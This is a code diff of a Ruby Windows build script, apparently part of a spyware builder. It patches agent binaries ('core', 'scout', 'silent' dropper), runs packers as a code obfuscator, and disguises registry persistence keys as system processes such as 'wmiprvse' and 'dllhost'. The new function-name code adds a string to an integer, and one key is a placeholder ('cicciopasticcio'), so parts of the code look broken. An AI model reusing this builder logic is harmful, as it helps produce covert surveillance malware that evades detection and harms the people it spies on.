@@ -35,6 +35,10 @@ class BuildWindows < Build
     # invoke the generic patch method with the new params
     super
 
+    # patch the core64
+    params[:core] = 'core64'
+    super
+
     # patch the scout
     params[:core] = 'scout'
     params[:config] = nil
@@ -47,9 +51,6 @@ class BuildWindows < Build
       content.binary_patch 'SHOT', @factory.configs.first.screenshot_enabled? ? "\x00\x00\x00\x00" : "\x01\x01\x01\x01"
     end
 
-    # calculate the function name for the dropper
-    @funcname = 'F' + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..4]
-
     patch_file(:file => 'core') do |content|
       begin
         # patching for the function name
@@ -59,11 +60,6 @@ class BuildWindows < Build
         # the new registry key
         marker = "Registry key"
         content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key(@factory.confkey).ljust(38, "\x00")
-        # and the old one (previous method)
-        core = scramble_name(@factory.seed, 3)
-        dir = scramble_name(core[0..7], 7)
-        reg = '*' + scramble_name(dir, 1)[1..-1]
-        content.binary_patch 'IaspdPDuFMfnm_apggLLL712j', reg.ljust(25, "\x00")
       rescue
         raise "#{marker} marker not found"
       end
@@ -75,14 +71,6 @@ class BuildWindows < Build
         # patching for the function name
         marker = "Funcname"
         patch_func_names(content)
-
-        # per-customer signature
-        marker = "Signature"
-        sign = ::Signature.where({scope: 'agent'}).first
-        signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
-        marker = 'ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ'
-        magic = LicenseManager.instance.limits[:magic] + marker.slice(8..-1)
-        content.binary_patch marker, signature
 
         # the new registry key
         marker = "Registry key"
@@ -98,11 +86,12 @@ class BuildWindows < Build
     patch_build_time('core64')
     patch_build_time('codec')
     patch_build_time('sqlite')
+    patch_build_time('silent')
+    patch_build_time('silent_admin')
 
     # code obfuscator
     CrossPlatform.exec path('packer32'), "#{path('core')}"
     CrossPlatform.exec path('packer64'), "#{path('core64')}"
-    CrossPlatform.exec path('packer'), "#{path('codec')}"
   end
 
   def scramble
@@ -116,7 +105,7 @@ class BuildWindows < Build
     driver = scramble_name(config, 4)
     driver64 = scramble_name(config, 16)
     core64 = scramble_name(config, 15)
-    oldreg = '*' + scramble_name(dir, 1)[1..-1]
+    oldreg = old_reg_start_key(@factory.confkey)
     reg = reg_start_key(@factory.confkey)
 
     @scrambled = {core: core, core64: core64, driver: driver, driver64: driver64,
@@ -264,11 +253,10 @@ class BuildWindows < Build
         f.puts "HSYS=ndisk.sys"
         f.puts "HKEY=#{key}"
         f.puts "MANIFEST=" + (@admin ? 'yes' : 'no')
-        f.puts "FUNC=" + @funcname
+        f.puts "FUNC=" + @funcnames[5]
         f.puts "INSTALLER=" + (@cooked ? 'no' : 'yes')
       end
       cook_param = '-C -R ' + path('') + ' -O ' + path('output')
-      cook_param += " -d #{path('demo_image')}" if @demo
     end
 
     CrossPlatform.exec path('cooker'), cook_param
@@ -288,9 +276,7 @@ class BuildWindows < Build
       # we have a static var of 1 MiB
       raise "cooked file is too big" if cooked.bytesize > 1024*1024
 
-      silent_file = @admin ? 'silent_admin' : 'silent'
-
-      patch_file(:file => silent_file) do |content|
+      patch_file(:file => 'silent') do |content|
         begin
           offset = content.index("\xef\xbe\xad\xde".force_encoding('ASCII-8BIT'))
           raise "offset is nil" if offset.nil?
@@ -302,7 +288,7 @@ class BuildWindows < Build
 
       # delete the cooked output file and overwrite it with the silent output
       FileUtils.rm_rf path('output')
-      FileUtils.cp path(silent_file), path('output')
+      FileUtils.cp path('silent'), path('output')
     end
   end
 
@@ -325,8 +311,7 @@ class BuildWindows < Build
                                           (@codec ? path(@scrambled[:codec]) : 'null') +' '+
                                           @scrambled[:dir]+' '+
                                           (@admin ? '1' : '0') +' '+
-                                          @funcname +' '+
-                                          (@demo ? path('demo_image') : 'null') +' '+
+                                          @funcnames[5] +' '+
                                           path('input') + ' ' +
                                           path('output')
     end
@@ -360,6 +345,11 @@ class BuildWindows < Build
   end
 
   def reg_start_key(seed)
+    fake_names = ['cicciopasticcio']
+    fake_names[seed.ord % fake_names.size]
+  end
+
+  def old_reg_start_key(seed)
     fakever = (seed[2].ord % 11).to_s + "." + seed.slice(0..2).unpack('S').first.to_s
 
     fake_names = ['wmiprvse', 'lssas', 'dllhost', 'IconStor', 'wsus', 'MSInst', 'WinIME',
@@ -440,10 +430,27 @@ class BuildWindows < Build
   end
 
   def patch_func_names(content)
-    markers = ['PFTBBP']
-    names = [@funcname]
-    markers.each_with_index do |find, index|
-      content.binary_patch find, names[index]
+    # calculate the function name for the dropper
+    @funcnames = []
+
+    (1..12).each do |index|
+      # take the first letter (ignore nums) of the log key
+      # it must be a letter since it's a function name
+      first_alpha = @factory.logkey.match(/[a-zA-Z]/)[0]
+      first_digit = @factory.logkey.match(/[0-9]/)[0]
+      progressive = ('A'.ord + (first_alpha.ord + first_digit + index) % 26).chr
+      @funcnames[index] = first_alpha + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..7] + progressive
+    end
+
+    trace :debug, @funcnames.inspect
+
+    (1..12).each do |index|
+      find = "PPPFTBBP%02d" % index
+
+      trace :debug, "FUNC: #{find} -> #{@funcnames[index]}"
+      trace :debug, "FUNC NOT FOUND: #{find}" unless content[find]
+
+      content.binary_patch find, @funcnames[index] if content[find]
     end
     content
   end
